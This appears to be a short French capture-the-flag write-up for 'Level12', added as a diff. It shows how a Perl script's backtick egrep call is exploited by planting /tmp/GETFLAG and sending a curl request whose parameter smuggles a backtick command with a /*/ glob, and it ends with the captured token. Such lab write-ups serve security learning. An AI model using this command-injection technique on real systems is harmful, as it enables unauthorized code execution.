@@ -1,0 +1,23 @@
+Level12
+Un fichier perl est present:
+En analysant ce fichier on remarque qu'il prend 2 parametres
+Le second n'est pas utilisé mais le premier si et on remarque que:
+  $xx = $_[0];
+  $xx =~ tr/a-z/A-Z/;
+  $xx =~ s/\s.*//;
+Il verifie que le nom de l'argument est en full majuscule + sans espace puis:
+  @output = `egrep "^$xx" /tmp/xd 2>&1`;
+egrep = grep sous forme de regex
+Donc on cree un fichier GETFLAG dans /tmp comme ceci:
+
+$> vim /tmp/GETFLAG
+getflag > /tmp/touken
+$> chmod +x /tmp/GETFLAG
+
+On ne peut pas mettre le path complet avec tmp cat tmp se transforme en TMP et cela ne fonctionne pas
+Il faut mettre le tout dans les back quote afin de pouvoir avoir le script qui execute notre code
+Avec curl:
+curl "http://localhost:4646/?x=\`/*/GETFLAG\`"
+
+$>cat /tmp/touken
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
